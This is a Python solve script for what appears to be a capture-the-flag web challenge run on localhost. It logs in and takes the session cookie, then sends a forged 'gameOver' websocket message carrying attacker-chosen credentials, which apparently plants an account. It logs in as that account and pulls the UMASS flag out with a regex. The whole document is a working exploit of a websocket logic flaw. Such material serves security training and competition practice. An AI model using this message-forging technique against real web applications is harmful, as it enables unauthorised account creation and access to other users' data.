from websocket import create_connection
import requests
import json
import re

remote = "localhost"
base_url = f"http://{remote}"

s = requests.Session()
username = "test"
password = "test"
s.post(f"{base_url}/register", data={"username": username, "password": password})
s.post(f"{base_url}/login", data={"username": username, "password": password})
user_cookie = s.cookies.get("user")
cookie_header = f"user={user_cookie}"

headers = {
        'Cookie': cookie_header,
}
ws = create_connection(f"ws://{remote}", header=headers)
username = "Ssundae"
password = "win"
data = {"type": "gameOver", "score": 200, "time": 2, "username": username, "password": password}
message = json.dumps(data)

ws.send(message)
s.get(f"{base_url}/logout")
s.post(f"{base_url}/login", data={"username": username, "password": password})
reg = re.search(r'(UMASS{.*?})',s.get(f"{base_url}/logout").text).group()
print(reg)